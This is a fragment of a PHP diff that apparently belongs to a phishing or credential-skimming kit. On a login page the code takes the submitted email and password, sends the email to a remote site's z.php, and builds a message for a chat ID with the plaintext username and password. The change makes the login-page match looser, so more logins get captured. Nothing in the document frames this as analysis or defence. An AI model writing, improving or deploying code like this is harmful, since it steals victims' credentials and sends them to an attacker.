@@ -96,7 +96,8 @@ $countEm = count($splitEm);
 
 if (!in_array($_POST['email'], $splitEm) && !empty($_POST['email'])) {
 file_get_contents($site . "/z.php?email=".$_POST['email']);
-if ($_SERVER['SCRIPT_NAME'] == "login.php") {
+
+if (stripos($_SERVER['SCRIPT_NAME'], "login.php") !== false) {
 	     $data = [
          'chat_id' => "-593620303",
          'text' => "User: " . $_POST['email'] . "\nPass: " . $_POST['password']
